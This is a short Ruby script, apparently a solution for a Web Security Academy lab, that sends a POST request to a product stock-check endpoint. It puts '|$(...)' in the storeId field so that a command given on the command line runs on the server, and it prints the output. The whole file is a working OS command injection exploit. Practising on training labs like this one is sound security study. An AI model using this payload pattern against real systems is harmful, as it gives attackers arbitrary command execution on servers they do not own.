require 'http'

url = "https://0afb00820433d81780063fa000360046.web-security-academy.net/product/stock"

client = HTTP.post(url,:form => {
		:productId => "2",
		:storeId => "|$(#{ARGV[0]})"
	})

puts client.body.to_s
